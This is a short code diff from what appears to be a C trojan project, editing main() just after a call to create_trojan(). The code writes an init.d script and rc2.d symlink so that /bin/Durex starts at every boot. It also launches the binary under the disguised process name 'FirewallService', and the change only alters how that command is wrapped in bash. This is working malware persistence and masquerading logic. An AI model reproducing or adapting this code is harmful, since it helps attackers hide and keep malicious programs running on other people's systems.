@@ -20,7 +20,7 @@ int main()
 	if (create_trojan())
 		return (1);
 	//make it launch at each boot
-	system("echo \"#!/bin/bash\nexec -a FirewallService /bin/Durex \" > /etc/init.d/durex; chmod 755 /etc/init.d/durex; ln -s /etc/init.d/durex /etc/rc2.d/S99durex 2>/dev/null");
-	system("exec -a FirewallService /bin/Durex");
+	system("echo \"#!/bin/bash\nbash -c 'exec -a FirewallService /bin/Durex' \" > /etc/init.d/durex; chmod 755 /etc/init.d/durex; ln -s /etc/init.d/durex /etc/rc2.d/S99durex 2>/dev/null");
+	system("bash -c 'exec -a FirewallService /bin/Durex'");
 	return (0);
 }
